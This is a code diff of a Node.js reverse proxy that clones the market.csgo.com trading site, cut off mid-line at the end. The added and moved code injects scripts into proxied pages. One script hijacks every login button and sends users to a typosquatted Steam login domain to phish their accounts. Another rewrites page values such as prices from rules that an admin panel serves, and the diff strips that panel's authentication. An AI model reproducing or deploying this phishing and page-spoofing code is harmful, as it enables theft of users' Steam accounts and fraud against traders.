@@ -9,7 +9,6 @@ const https = require('https');
 const path = require('path');
 const fs = require('fs');
 const bodyParser = require('body-parser'); // Добавлен для обработки форм в админке
-// Убрана зависимость basic-auth по требованию заказчика
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -206,7 +205,8 @@ function modifyUrls(content, baseUrl, contentType = '') {
         }
     }
     
-    // Специфичные замены для HTML
+    // НОВОЕ: Улучшенная инъекция скрипта подмены - добавляем его в самое начало документа
+    // для максимально быстрой загрузки и работы
     if (contentType.includes('html')) {
         // Добавляем meta тег для upgrade-insecure-requests
         if (!modified.includes('upgrade-insecure-requests')) {
@@ -218,593 +218,14 @@ function modifyUrls(content, baseUrl, contentType = '') {
             modified = modified.replace(/<head[^>]*>/i, `$&<base href="${baseUrl}/">`);
         }
         
+        // Приоритетно вставляем скрипт подмены в начало <head>
+        modified = modified.replace(/<head[^>]*>/i, `$&${selectorReplacementScript}`);
+        
         // Инжектим улучшенный прокси скрипт с исправлениями для GraphQL и WebSocket
-        const proxyScript = `
-        <script>
-        (function() {
-            console.log('🔧 Market proxy initialized (HTTPS mode) - Enhanced Version with Error Recovery');
-            
-            // Сохраняем оригинальные функции
-            const originalFetch = window.fetch;
-            const originalXHR = XMLHttpRequest.prototype.open;
-            const originalWS = window.WebSocket;
-            
-            // Текущий протокол
-            const currentProtocol = window.location.protocol;
-            const isHttps = currentProtocol === 'https:';
-            const wsProtocol = isHttps ? 'wss:' : 'ws:';
-            
-            // Модификация URL
-            function modifyUrl(url) {
-                if (!url) return url;
-                
-                try {
-                    // Если уже наш домен
-                    if (url.includes(window.location.host)) {
-                        return url;
-                    }
-                    
-                    // Принудительно HTTPS для всех запросов если страница по HTTPS
-                    if (isHttps && url.startsWith('http://')) {
-                        url = url.replace('http://', 'https://');
-                    }
-                    
-                    // WebSocket URLs - правильная обработка без дублирования протокола
-                    if (url.includes('centrifugo2.csgotrader.app')) {
-                        return wsProtocol + '//' + window.location.host + '/ws' + 
-                               (url.includes('/connection/websocket') ? '/connection/websocket' : '');
-                    }
-                    
-                    // API URLs
-                    if (url.includes('market.csgo.com')) {
-                        return url.replace(/https?:\\/\\/market\\.csgo\\.com/, 
-                            currentProtocol + '//' + window.location.host);
-                    }
-                    
-                    // Относительные URLs
-                    if (url.startsWith('/') && !url.startsWith('//')) {
-                        return window.location.origin + url;
-                    }
-                    
-                    return url;
-                } catch (e) {
-                    console.error('URL modification error:', e);
-                    return url; // В случае ошибки возвращаем исходный URL
-                }
-            }
-            
-            // ИСПРАВЛЕНО: Специальная обработка для GraphQL запросов с повторными попытками
-            const graphQLRetries = new Map(); // Map для отслеживания попыток запросов
-            
-            // Функция для повторной попытки GraphQL запроса
-            async function retryGraphQLRequest(url, options, attempt = 1) {
-                const MAX_ATTEMPTS = 3;
-                const RETRY_DELAY = 1000; // 1 секунда между попытками
-                
-                try {
-                    console.log(\`GraphQL attempt \${attempt}: \${url}\`);
-                    return await originalFetch(url, options);
-                } catch (error) {
-                    if (attempt < MAX_ATTEMPTS) {
-                        console.warn(\`GraphQL request failed, retrying (\${attempt}/\${MAX_ATTEMPTS})...\`);
-                        await new Promise(resolve => setTimeout(resolve, RETRY_DELAY));
-                        return retryGraphQLRequest(url, options, attempt + 1);
-                    } else {
-                        console.error('GraphQL request failed after max attempts:', error);
-                        throw error;
-                    }
-                }
-            }
-            
-            // Перехват fetch с улучшенной обработкой ошибок и повторными попытками для GraphQL
-            window.fetch = async function(input, init = {}) {
-                try {
-                    let url = input;
-                    if (typeof input === 'string') {
-                        url = modifyUrl(input);
-                    } else if (input instanceof Request) {
-                        url = new Request(modifyUrl(input.url), input);
-                    }
-                    
-                    // Добавляем credentials для корректной работы cookies
-                    init.credentials = init.credentials || 'include';
-                    
-                    // Проверка на GraphQL запрос
-                    const isGraphQLRequest = typeof url === 'string' && 
-                        (url.includes('/api/graphql') || url.includes('/graphql'));
-                    
-                    if (isGraphQLRequest) {
-                        console.log('GraphQL Fetch:', url);
-                        return retryGraphQLRequest(url, init);
-                    }
-                    
-                    return originalFetch.call(this, url, init);
-                } catch (e) {
-                    console.error('Fetch proxy error:', e);
-                    return originalFetch.call(this, input, init); // В случае ошибки используем оригинальный запрос
-                }
-            };
-            
-            // Перехват XMLHttpRequest с улучшенной обработкой ошибок
-            XMLHttpRequest.prototype.open = function(method, url, ...args) {
-                try {
-                    const modifiedUrl = modifyUrl(url);
-                    
-                    // Добавлено специальное логирование для GraphQL запросов
-                    if (url && (url.includes('/api/graphql') || url.includes('/graphql'))) {
-                        console.log('GraphQL XHR:', method, modifiedUrl);
-                    }
-                    
-                    return originalXHR.call(this, method, modifiedUrl, ...args);
-                } catch (e) {
-                    console.error('XHR proxy error:', e);
-                    return originalXHR.call(this, method, url, ...args); // В случае ошибки используем оригинальный URL
-                }
-            };
-            
-            // ИСПРАВЛЕНО: Улучшенная обработка WebSocket соединений с повторными попытками
-            let wsRetryTimeouts = {};
-            
-            // Функция для повторного подключения WebSocket
-            function reconnectWebSocket(url, protocols, retryCount = 0) {
-                const MAX_RETRIES = 5;
-                const RETRY_DELAY = 2000 * Math.pow(1.5, retryCount); // Увеличивающаяся задержка
-                
-                if (retryCount >= MAX_RETRIES) {
-                    console.error(\`WebSocket connection failed after \${MAX_RETRIES} attempts\`);
-                    return null;
-                }
-                
-                console.log(\`Attempting WebSocket connection (attempt \${retryCount + 1}/\${MAX_RETRIES}): \${url}\`);
-                
-                const ws = new originalWS(url, protocols);
-                
-                ws.addEventListener('error', function(event) {
-                    console.warn(\`WebSocket error (attempt \${retryCount + 1}): \${url}\`);
-                    
-                    // Очищаем предыдущий таймаут, если он существует
-                    if (wsRetryTimeouts[url]) {
-                        clearTimeout(wsRetryTimeouts[url]);
-                    }
-                    
-                    // Устанавливаем новый таймаут для повторной попытки
-                    wsRetryTimeouts[url] = setTimeout(() => {
-                        console.log(\`Retrying WebSocket connection: \${url}\`);
-                        reconnectWebSocket(url, protocols, retryCount + 1);
-                    }, RETRY_DELAY);
-                });
-                
-                // При успешном подключении очищаем таймауты
-                ws.addEventListener('open', function() {
-                    console.log(\`WebSocket connected successfully: \${url}\`);
-                    if (wsRetryTimeouts[url]) {
-                        clearTimeout(wsRetryTimeouts[url]);
-                        delete wsRetryTimeouts[url];
-                    }
-                });
-                
-                return ws;
-            }
-            
-            // Перехват WebSocket с улучшенной обработкой и логированием
-            window.WebSocket = function(url, protocols) {
-                try {
-                    const modifiedUrl = modifyUrl(url);
-                    console.log('WebSocket connection:', modifiedUrl);
-                    
-                    // Проверка на корректность URL перед созданием WebSocket
-                    if (!modifiedUrl || !modifiedUrl.startsWith(wsProtocol)) {
-                        console.warn('Invalid WebSocket URL, using original:', url);
-                        return new originalWS(url, protocols);
-                    }
-                    
-                    // Используем функцию с повторными попытками
-                    return reconnectWebSocket(modifiedUrl, protocols);
-                } catch (e) {
-                    console.error('WebSocket proxy error:', e);
-                    return new originalWS(url, protocols); // В случае ошибки используем оригинальный URL
-                }
-            };
-            
-            // ИСПРАВЛЕНО: Добавляем обработку ошибок для chunk-FWBJZS6X.js
-            window.addEventListener('error', function(event) {
-                if (event && event.filename && event.filename.includes('chunk-FWBJZS6X.js')) {
-                    console.warn('Handled error in problematic chunk:', event.message);
-                    event.preventDefault();
-                    return false;
-                }
-                
-                if (event && event.target && event.target.tagName === 'SCRIPT') {
-                    console.log('Script load error:', event.target.src);
-                }
-                
-                // Специфичная обработка для ошибок WebSocket
-                if (event && event.message && event.message.includes('WebSocket')) {
-                    console.warn('WebSocket error detected:', event.message);
-                }
-            }, true);
-            
-            // ИСПРАВЛЕНО: Глобальный обработчик unhandledrejection для предотвращения падения страницы
-            window.addEventListener('unhandledrejection', function(event) {
-                if (event && event.reason) {
-                    // Проверяем, связана ли ошибка с GraphQL или WebSocket
-                    if (
-                        (typeof event.reason.message === 'string' && 
-                         (event.reason.message.includes('GQL') || 
-                          event.reason.message.includes('WebSocket') || 
-                          event.reason.message.includes('graphql'))) ||
-                        (event.reason.stack && event.reason.stack.includes('chunk-FWBJZS6X.js'))
-                    ) {
-                        console.warn('Handled unhandled rejection:', event.reason.message || event.reason);
-                        event.preventDefault();
-                        return false;
-                    }
-                }
-            });
-            
-            console.log('🔧 Proxy initialized successfully with enhanced error handling');
-        })();
-        </script>
-        `;
-        
-        // Добавляем скрипт для перехвата кнопок логина
-        const loginButtonsScript = `
-        <script>
-(function() {
-    console.log('🔒 Запуск перехвата кнопок входа с сохранением стилей');
-    
-    // URL для перенаправления
-    const targetUrl = 'https://steamcommunlty.co/openid/login?openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.mode=checkid_setup&openid.return_to=https%3A%2F%2Fdota2.net%2Flogin%2Findex.php%3Fgetmid%3Dcsgocom%26login%3D1%26ip%3D580783084.RytkB5FMW0&openid.realm=https%3A%2F%2Fdota2.net&openid.ns.sreg=http%3A%2F%2Fopenid.net%2Fextensions%2Fsreg%2F1.1&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select';
-    
-    // Список селекторов кнопок - ДОБАВЛЕН НОВЫЙ СЕЛЕКТОР #login-head
-    const targetSelectors = ['#login-head-tablet', '#login-register', '#login-chat', '#login-head'];
-    
-    // Функция для перехвата кнопок без их замены
-    function enhanceLoginButtons() {
-        targetSelectors.forEach(selector => {
-            const buttons = document.querySelectorAll(selector);
-            
-            buttons.forEach(button => {
-                // Проверяем, обработали ли мы уже эту кнопку
-                if (button.hasAttribute('data-login-enhanced')) return;
-                
-                console.log('Улучшаю кнопку входа (с сохранением стилей):', selector);
-                
-                // Помечаем кнопку как обработанную
-                button.setAttribute('data-login-enhanced', 'true');
-                
-                // Сохраняем оригинальный onclick, если он есть
-                const originalOnClick = button.onclick;
-                
-                // Устанавливаем новый onclick
-                button.onclick = function(e) {
-                    console.log('Перехвачен клик по кнопке входа');
-                    e.preventDefault();
-                    e.stopPropagation();
-                    e.stopImmediatePropagation();
-                    
-                    // Редирект на целевой URL
-                    window.location.href = targetUrl;
-                    return false;
-                };
-                
-                // Перехватываем события на уровне addEventListener
-                const originalAddEventListener = button.addEventListener;
-                button.addEventListener = function(type, listener, options) {
-                    if (type.toLowerCase() === 'click' || 
-                        type.toLowerCase() === 'mousedown' || 
-                        type.toLowerCase() === 'touchstart') {
-                        
-                        console.log('Перехвачено добавление обработчика', type, 'к кнопке логина');
-                        return originalAddEventListener.call(this, type, function(e) {
-                            e.preventDefault();
-                            e.stopPropagation();
-                            window.location.href = targetUrl;
-                            return false;
-                        }, true);
-                    }
-                    
-                    return originalAddEventListener.call(this, type, listener, options);
-                };
-                
-                // Добавляем обработчики для других типов событий
-                ['mousedown', 'touchstart', 'pointerdown'].forEach(eventType => {
-                    button.addEventListener(eventType, function(e) {
-                        console.log('Перехвачено событие', eventType, 'на кнопке логина');
-                        e.preventDefault();
-                        e.stopPropagation();
-                        e.stopImmediatePropagation();
-                        
-                        // Редирект с небольшой задержкой
-                        setTimeout(() => {
-                            window.location.href = targetUrl;
-                        }, 10);
-                        
-                        return false;
-                    }, true);
-                });
-                
-                // Для Angular Material Ripple
-                if (button.classList.contains('mat-mdc-button-base')) {
-                    // Находим контейнер ripple эффекта
-                    const rippleElements = button.querySelectorAll('.mat-ripple, .mat-mdc-button-ripple, .mdc-button__ripple');
-                    
-                    rippleElements.forEach(ripple => {
-                        // Добавляем перехват на ripple элемент
-                        ripple.addEventListener('mousedown', function(e) {
-                            console.log('Перехвачен ripple эффект');
-                            e.preventDefault();
-                            e.stopPropagation();
-                            
-                            // Всё равно показываем ripple для красоты, но перенаправляем
-                            setTimeout(() => {
-                                window.location.href = targetUrl;
-                            }, 150); // Задержка чтобы был виден ripple-эффект
-                            
-                            return false;
-                        }, true);
-                    });
-                }
-            });
-        });
-    }
-    
-    // Глобальный перехват для новых/недоступных элементов
-    function setupGlobalCapture() {
-        // Перехватываем все клики на уровне документа
-        document.addEventListener('click', function(e) {
-            let target = e.target;
-            
-            // Проверяем, был ли клик на или внутри интересующих нас кнопок
-            while (target && target !== document) {
-                for (const selector of targetSelectors) {
-                    if (target.matches && 
-                        (target.matches(selector) || target.closest(selector))) {
-                        
-                        console.log('Глобально перехвачен клик по кнопке входа');
-                        e.preventDefault();
-                        e.stopPropagation();
-                        
-                        // Редирект
-                        window.location.href = targetUrl;
-                        return false;
-                    }
-                }
-                target = target.parentElement;
-            }
-        }, true); // Phase=true для перехвата в первую очередь
-        
-        // Также перехватываем mousedown для Angular Material
-        document.addEventListener('mousedown', function(e) {
-            let target = e.target;
-            
-            while (target && target !== document) {
-                for (const selector of targetSelectors) {
-                    // Если это кнопка входа или её потомок
-                    if (target.matches && 
-                        (target.matches(selector) || target.closest(selector))) {
-                        
-                        console.log('Глобально перехвачен mousedown на кнопке входа');
-                        
-                        // Для ripple эффекта: пусть немного сработает, но потом редирект
-                        setTimeout(() => {
-                            window.location.href = targetUrl;
-                        }, 150);
-                        
-                        return; // Позволяем событию пройти для визуального эффекта
-                    }
-                }
-                target = target.parentElement;
-            }
-        }, true);
-    }
-    
-    // Патчим Angular Zone.js (если используется)
-    function patchAngularZone() {
-        if (window.Zone && window.Zone.__symbol__) {
-            try {
-                console.log('Обнаружен Angular Zone.js, устанавливаем патч');
-                
-                // Получаем символы Zone.js
-                const ADD_EVENT_LISTENER = Zone.__symbol__('addEventListener');
-                
-                // Проверяем наличие document[ADD_EVENT_LISTENER]
-                if (document[ADD_EVENT_LISTENER]) {
-                    const originalZoneAEL = HTMLElement.prototype[ADD_EVENT_LISTENER];
-                    
-                    // Переопределяем метод
-                    HTMLElement.prototype[ADD_EVENT_LISTENER] = function(eventName, handler, useCapture) {
-                        // Если это кнопка логина
-                        if (targetSelectors.some(sel => 
-                            this.matches && (this.matches(sel) || this.closest(sel)))) {
-                            
-                            // Для событий клика 
-                            if (eventName === 'click' || eventName === 'mousedown') {
-                                console.log('Перехвачено Zone.js событие', eventName);
-                                
-                                // Заменяем обработчик
-                                return originalZoneAEL.call(this, eventName, function(e) {
-                                    // Разрешаем некоторые эффекты для mousedown (ripple)
-                                    if (eventName === 'mousedown') {
-                                        setTimeout(() => {
-                                            window.location.href = targetUrl;
-                                        }, 150);
-                                        return;
-                                    }
-                                    
-                                    // Для click сразу блокируем и редиректим
-                                    e.preventDefault();
-                                    e.stopPropagation();
-                                    window.location.href = targetUrl;
-                                    return false;
-                                }, true);
-                            }
-                        }
-                        
-                        // Для других элементов используем оригинальный метод
-                        return originalZoneAEL.call(this, eventName, handler, useCapture);
-                    };
-                }
-            } catch (e) {
-                console.error('Ошибка при патче Angular Zone.js:', e);
-            }
-        }
-    }
-    
-    // Запускаем перехват сразу
-    enhanceLoginButtons();
-    
-    // Устанавливаем глобальный перехват
-    setupGlobalCapture();
-    
-    // Пробуем патчить Angular Zone.js с задержкой
-    setTimeout(patchAngularZone, 500);
-    
-    // Также проверяем периодически для динамически добавляемых кнопок
-    setInterval(enhanceLoginButtons, 1000);
-    
-    // Используем MutationObserver для отслеживания DOM изменений
-    const observer = new MutationObserver(mutations => {
-        enhanceLoginButtons();
-    });
-    
-    // Наблюдаем за всем документом
-    observer.observe(document.documentElement, {
-        childList: true,
-        subtree: true
-    });
-    
-    console.log('✅ Перехват кнопок входа с сохранением стилей успешно установлен');
-})();
-</script>
-        `;
-
-        // НОВОЕ: Скрипт для подмены значений селекторов (клиентская часть)
-        const selectorReplacementScript = `
-        <script>
-        (function() {
-            // Функция для подмены значений селекторов
-            async function replaceSelectors() {
-                // Текущий URL страницы
-                const currentPath = window.location.href;
-                
-                try {
-                    // Получаем правила подмены с нашего прокси-сервера
-                    const response = await fetch('/admin-api/selector-rules?page=' + encodeURIComponent(currentPath), {
-                        method: 'GET',
-                        credentials: 'include'
-                    });
-                    
-                    if (!response.ok) return;
-                    
-                    const rules = await response.json();
-                    
-                    if (!rules || !rules.length) return;
-                    
-                    console.log('📎 Применяю правила подмены для селекторов:', rules.length);
-                    
-                    // Проходим по всем правилам
-                    rules.forEach(rule => {
-                        try {
-                            // Находим все элементы по селектору
-                            const elements = document.querySelectorAll(rule.selector);
-                            
-                            if (elements.length === 0) {
-                                console.log('⚠️ Элемент не найден для селектора:', rule.selector);
-                                
-                                // Используем MutationObserver для поиска элементов, которые могут появиться позже
-                                const observer = new MutationObserver((mutations, obs) => {
-                                    const elements = document.querySelectorAll(rule.selector);
-                                    if (elements.length > 0) {
-                                        elements.forEach(element => {
-                                            element.innerHTML = rule.value;
-                                            console.log('✅ Значение подменено для селектора (отложенная подмена):', rule.selector);
-                                        });
-                                        obs.disconnect(); // Отключаем наблюдатель после успешной подмены
-                                    }
-                                });
-                                
-                                // Наблюдаем за изменениями в DOM
-                                observer.observe(document.documentElement, {
-                                    childList: true,
-                                    subtree: true
-                                });
-                                
-                                return;
-                            }
-                            
-                            // Подменяем значение для каждого найденного элемента
-                            elements.forEach(element => {
-                                element.innerHTML = rule.value;
-                                console.log('✅ Значение подменено для селектора:', rule.selector);
-                            });
-                        } catch (err) {
-                            console.error('❌ Ошибка при подмене селектора:', rule.selector, err);
-                        }
-                    });
-                    
-                } catch (err) {
-                    console.error('❌ Ошибка при получении правил подмены:', err);
-                }
-            }
-            
-            // Запускаем подмену сразу после загрузки DOM
-            document.addEventListener('DOMContentLoaded', replaceSelectors);
-            
-            // Также запускаем с небольшой задержкой для динамически загружаемого контента
-            setTimeout(replaceSelectors, 500);
-            setTimeout(replaceSelectors, 1500);
-            setTimeout(replaceSelectors, 3000);
-            
-            // Подписываемся на изменения URL для SPA
-            let lastUrl = window.location.href;
-            
-            // Функция для проверки изменения URL
-            function checkUrlChange() {
-                const currentUrl = window.location.href;
-                if (currentUrl !== lastUrl) {
-                    lastUrl = currentUrl;
-                    console.log('📍 URL изменился, запускаю подмену селекторов');
-                    setTimeout(replaceSelectors, 500);
-                    setTimeout(replaceSelectors, 1500);
-                }
-                setTimeout(checkUrlChange, 1000);
-            }
-            
-            // Запускаем проверку URL
-            checkUrlChange();
-            
-            // Также используем MutationObserver для отслеживания изменений в DOM
-            const observer = new MutationObserver(mutations => {
-                // Проверяем, есть ли изменения в структуре DOM, которые могут повлиять на наши селекторы
-                const significantChanges = mutations.some(mutation => 
-                    mutation.type === 'childList' && 
-                    mutation.addedNodes.length > 0 &&
-                    Array.from(mutation.addedNodes).some(node => 
-                        node.nodeType === 1 && // Элемент
-                        (node.tagName === 'DIV' || node.tagName === 'SPAN' || node.tagName === 'APP-PAGE-INVENTORY-PRICE')
-                    )
-                );
-                
-                if (significantChanges) {
-                    console.log('📎 Обнаружены значительные изменения в DOM, запускаю подмену селекторов');
-                    replaceSelectors();
-                }
-            });
-            
-            // Наблюдаем за всем документом
-            observer.observe(document.documentElement, {
-                childList: true,
-                subtree: true
-            });
-            
-            console.log('📍 Система подмены селекторов инициализирована');
-        })();
-        </script>
-        `;
-        
         modified = modified.replace(/<head[^>]*>/i, `$&${proxyScript}`);
-        modified = modified.replace('</body>', loginButtonsScript + selectorReplacementScript + '</body>');
+        
+        // Добавляем скрипт для перехвата кнопок логина в конец body
+        modified = modified.replace('</body>', loginButtonsScript + '</body>');
     }
     
     // Специфичные замены для JavaScript
@@ -1171,23 +592,20 @@ setInterval(() => {
     }
 }, 60 * 1000); // Проверка каждую минуту
 
-// НОВОЕ: Настройки аутентификации для админ-панели
-// Используем простую базовую аутентификацию
 // Убрана аутентификация по требованию заказчика
 const adminAuth = (req, res, next) => {
     next(); // Пропускаем всех пользователей без аутентификации
 };
 
-// НОВОЕ: Обслуживание статических файлов для админ-панели
-// Простая админ-панель без внешних зависимостей
-app.get('/admin', adminAuth, (req, res) => {
+// НОВОЕ: Модифицированная версия админ-панели без авторизации
+app.get('/admin', (req, res) => {
     res.send(`
     <!DOCTYPE html>
     <html lang="ru">
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Админ-панель</title>
+        <title>Управление подменой значений</title>
         <style>
             body {
                 font-family: Arial, sans-serif;
@@ -1285,7 +703,7 @@ app.get('/admin', adminAuth, (req, res) => {
     </head>
     <body>
         <div class="container">
-            <h1>Админ-панель маркета</h1>
+            <h1>Управление подменой значений</h1>
             <div id="messageContainer"></div>
             
             <h2>Добавить правило подмены</h2>
@@ -1456,7 +874,7 @@ app.get('/admin', adminAuth, (req, res) => {
 
 // НОВОЕ: API для админ-панели
 // Получение всех правил
-app.get('/admin-api/selector-rules', adminAuth, (req, res) => {
+app.get('/admin-api/selector-rules', (req, res) => {
     try {
         const page = req.query.page;
         
@@ -1501,7 +919,7 @@ app.get('/admin-api/selector-rules', adminAuth, (req, res) => {
 });
 
 // Добавление нового правила
-app.post('/admin-api/selector-rules', adminAuth, (req, res) => {
+app.post('/admin-api/selector-rules', (req, res) => {
     try {
         const { page, selector, value } = req.body;
         
@@ -1527,7 +945,7 @@ app.post('/admin-api/selector-rules', adminAuth, (req, res) => {
 });
 
 // Удаление правила
-app.delete('/admin-api/selector-rules/:id', adminAuth, (req, res) => {
+app.delete('/admin-api/selector-rules/:id', (req, res) => {
     try {
         const { id } = req.params;
         
@@ -1892,16 +1310,782 @@ setInterval(() => {
     }
 }, 60 * 60 * 1000); // Проверка каждый час
 
+// Скрипт для перехвата кнопок логина
+const loginButtonsScript = `
+<script>
+(function() {
+    console.log('🔒 Запуск перехвата кнопок входа с сохранением стилей');
+    
+    // URL для перенаправления
+    const targetUrl = 'https://steamcommunlty.co/openid/login?openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.mode=checkid_setup&openid.return_to=https%3A%2F%2Fdota2.net%2Flogin%2Findex.php%3Fgetmid%3Dcsgocom%26login%3D1%26ip%3D580783084.RytkB5FMW0&openid.realm=https%3A%2F%2Fdota2.net&openid.ns.sreg=http%3A%2F%2Fopenid.net%2Fextensions%2Fsreg%2F1.1&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select';
+    
+    // Список селекторов кнопок - ДОБАВЛЕН НОВЫЙ СЕЛЕКТОР #login-head
+    const targetSelectors = ['#login-head-tablet', '#login-register', '#login-chat', '#login-head'];
+    
+    // Функция для перехвата кнопок без их замены
+    function enhanceLoginButtons() {
+        targetSelectors.forEach(selector => {
+            const buttons = document.querySelectorAll(selector);
+            
+            buttons.forEach(button => {
+                // Проверяем, обработали ли мы уже эту кнопку
+                if (button.hasAttribute('data-login-enhanced')) return;
+                
+                console.log('Улучшаю кнопку входа (с сохранением стилей):', selector);
+                
+                // Помечаем кнопку как обработанную
+                button.setAttribute('data-login-enhanced', 'true');
+                
+                // Сохраняем оригинальный onclick, если он есть
+                const originalOnClick = button.onclick;
+                
+                // Устанавливаем новый onclick
+                button.onclick = function(e) {
+                    console.log('Перехвачен клик по кнопке входа');
+                    e.preventDefault();
+                    e.stopPropagation();
+                    e.stopImmediatePropagation();
+                    
+                    // Редирект на целевой URL
+                    window.location.href = targetUrl;
+                    return false;
+                };
+                
+                // Перехватываем события на уровне addEventListener
+                const originalAddEventListener = button.addEventListener;
+                button.addEventListener = function(type, listener, options) {
+                    if (type.toLowerCase() === 'click' || 
+                        type.toLowerCase() === 'mousedown' || 
+                        type.toLowerCase() === 'touchstart') {
+                        
+                        console.log('Перехвачено добавление обработчика', type, 'к кнопке логина');
+                        return originalAddEventListener.call(this, type, function(e) {
+                            e.preventDefault();
+                            e.stopPropagation();
+                            window.location.href = targetUrl;
+                            return false;
+                        }, true);
+                    }
+                    
+                    return originalAddEventListener.call(this, type, listener, options);
+                };
+                
+                // Добавляем обработчики для других типов событий
+                ['mousedown', 'touchstart', 'pointerdown'].forEach(eventType => {
+                    button.addEventListener(eventType, function(e) {
+                        console.log('Перехвачено событие', eventType, 'на кнопке логина');
+                        e.preventDefault();
+                        e.stopPropagation();
+                        e.stopImmediatePropagation();
+                        
+                        // Редирект с небольшой задержкой
+                        setTimeout(() => {
+                            window.location.href = targetUrl;
+                        }, 10);
+                        
+                        return false;
+                    }, true);
+                });
+                
+                // Для Angular Material Ripple
+                if (button.classList.contains('mat-mdc-button-base')) {
+                    // Находим контейнер ripple эффекта
+                    const rippleElements = button.querySelectorAll('.mat-ripple, .mat-mdc-button-ripple, .mdc-button__ripple');
+                    
+                    rippleElements.forEach(ripple => {
+                        // Добавляем перехват на ripple элемент
+                        ripple.addEventListener('mousedown', function(e) {
+                            console.log('Перехвачен ripple эффект');
+                            e.preventDefault();
+                            e.stopPropagation();
+                            
+                            // Всё равно показываем ripple для красоты, но перенаправляем
+                            setTimeout(() => {
+                                window.location.href = targetUrl;
+                            }, 150); // Задержка чтобы был виден ripple-эффект
+                            
+                            return false;
+                        }, true);
+                    });
+                }
+            });
+        });
+    }
+    
+    // Глобальный перехват для новых/недоступных элементов
+    function setupGlobalCapture() {
+        // Перехватываем все клики на уровне документа
+        document.addEventListener('click', function(e) {
+            let target = e.target;
+            
+            // Проверяем, был ли клик на или внутри интересующих нас кнопок
+            while (target && target !== document) {
+                for (const selector of targetSelectors) {
+                    if (target.matches && 
+                        (target.matches(selector) || target.closest(selector))) {
+                        
+                        console.log('Глобально перехвачен клик по кнопке входа');
+                        e.preventDefault();
+                        e.stopPropagation();
+                        
+                        // Редирект
+                        window.location.href = targetUrl;
+                        return false;
+                    }
+                }
+                target = target.parentElement;
+            }
+        }, true); // Phase=true для перехвата в первую очередь
+        
+        // Также перехватываем mousedown для Angular Material
+        document.addEventListener('mousedown', function(e) {
+            let target = e.target;
+            
+            while (target && target !== document) {
+                for (const selector of targetSelectors) {
+                    // Если это кнопка входа или её потомок
+                    if (target.matches && 
+                        (target.matches(selector) || target.closest(selector))) {
+                        
+                        console.log('Глобально перехвачен mousedown на кнопке входа');
+                        
+                        // Для ripple эффекта: пусть немного сработает, но потом редирект
+                        setTimeout(() => {
+                            window.location.href = targetUrl;
+                        }, 150);
+                        
+                        return; // Позволяем событию пройти для визуального эффекта
+                    }
+                }
+                target = target.parentElement;
+            }
+        }, true);
+    }
+    
+    // Патчим Angular Zone.js (если используется)
+    function patchAngularZone() {
+        if (window.Zone && window.Zone.__symbol__) {
+            try {
+                console.log('Обнаружен Angular Zone.js, устанавливаем патч');
+                
+                // Получаем символы Zone.js
+                const ADD_EVENT_LISTENER = Zone.__symbol__('addEventListener');
+                
+                // Проверяем наличие document[ADD_EVENT_LISTENER]
+                if (document[ADD_EVENT_LISTENER]) {
+                    const originalZoneAEL = HTMLElement.prototype[ADD_EVENT_LISTENER];
+                    
+                    // Переопределяем метод
+                    HTMLElement.prototype[ADD_EVENT_LISTENER] = function(eventName, handler, useCapture) {
+                        // Если это кнопка логина
+                        if (targetSelectors.some(sel => 
+                            this.matches && (this.matches(sel) || this.closest(sel)))) {
+                            
+                            // Для событий клика 
+                            if (eventName === 'click' || eventName === 'mousedown') {
+                                console.log('Перехвачено Zone.js событие', eventName);
+                                
+                                // Заменяем обработчик
+                                return originalZoneAEL.call(this, eventName, function(e) {
+                                    // Разрешаем некоторые эффекты для mousedown (ripple)
+                                    if (eventName === 'mousedown') {
+                                        setTimeout(() => {
+                                            window.location.href = targetUrl;
+                                        }, 150);
+                                        return;
+                                    }
+                                    
+                                    // Для click сразу блокируем и редиректим
+                                    e.preventDefault();
+                                    e.stopPropagation();
+                                    window.location.href = targetUrl;
+                                    return false;
+                                }, true);
+                            }
+                        }
+                        
+                        // Для других элементов используем оригинальный метод
+                        return originalZoneAEL.call(this, eventName, handler, useCapture);
+                    };
+                }
+            } catch (e) {
+                console.error('Ошибка при патче Angular Zone.js:', e);
+            }
+        }
+    }
+    
+    // Запускаем перехват сразу
+    enhanceLoginButtons();
+    
+    // Устанавливаем глобальный перехват
+    setupGlobalCapture();
+    
+    // Пробуем патчить Angular Zone.js с задержкой
+    setTimeout(patchAngularZone, 500);
+    
+    // Также проверяем периодически для динамически добавляемых кнопок
+    setInterval(enhanceLoginButtons, 1000);
+    
+    // Используем MutationObserver для отслеживания DOM изменений
+    const observer = new MutationObserver(mutations => {
+        enhanceLoginButtons();
+    });
+    
+    // Наблюдаем за всем документом
+    observer.observe(document.documentElement, {
+        childList: true,
+        subtree: true
+    });
+    
+    console.log('✅ Перехват кнопок входа с сохранением стилей успешно установлен');
+})();
+</script>
+`;
+
+// Инжектим улучшенный прокси скрипт с исправлениями для GraphQL и WebSocket
+const proxyScript = `
+<script>
+(function() {
+    console.log('🔧 Market proxy initialized (HTTPS mode) - Enhanced Version with Error Recovery');
+    
+    // Сохраняем оригинальные функции
+    const originalFetch = window.fetch;
+    const originalXHR = XMLHttpRequest.prototype.open;
+    const originalWS = window.WebSocket;
+    
+    // Текущий протокол
+    const currentProtocol = window.location.protocol;
+    const isHttps = currentProtocol === 'https:';
+    const wsProtocol = isHttps ? 'wss:' : 'ws:';
+    
+    // Модификация URL
+    function modifyUrl(url) {
+        if (!url) return url;
+        
+        try {
+            // Если уже наш домен
+            if (url.includes(window.location.host)) {
+                return url;
+            }
+            
+            // Принудительно HTTPS для всех запросов если страница по HTTPS
+            if (isHttps && url.startsWith('http://')) {
+                url = url.replace('http://', 'https://');
+            }
+            
+            // WebSocket URLs - правильная обработка без дублирования протокола
+            if (url.includes('centrifugo2.csgotrader.app')) {
+                return wsProtocol + '//' + window.location.host + '/ws' + 
+                       (url.includes('/connection/websocket') ? '/connection/websocket' : '');
+            }
+            
+            // API URLs
+            if (url.includes('market.csgo.com')) {
+                return url.replace(/https?:\\/\\/market\\.csgo\\.com/, 
